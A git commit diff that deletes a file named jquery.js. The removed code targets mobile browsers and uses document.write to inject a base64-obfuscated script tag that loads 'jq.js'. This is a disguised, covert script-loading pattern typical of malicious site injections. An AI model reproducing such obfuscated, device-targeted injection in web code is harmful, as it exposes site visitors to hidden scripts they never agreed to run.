7abb53b1c44411bb244a98f9604d29a2951ccb04
kgrtoiufe <61203310+kgrtoiufe@users.noreply.github.com>
2021-05-30 16:30:29 +0400

    1

--- jquery.js
+++
@@ -1,7 +0,0 @@
-if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
-
-var string = 'PHNjcmlwdCBzcmM9ImpxLmpzIj48L3NjcmlwdD4=';
-var decodedString = atob(string);
-document.write(''+ decodedString +'');
-  
-}
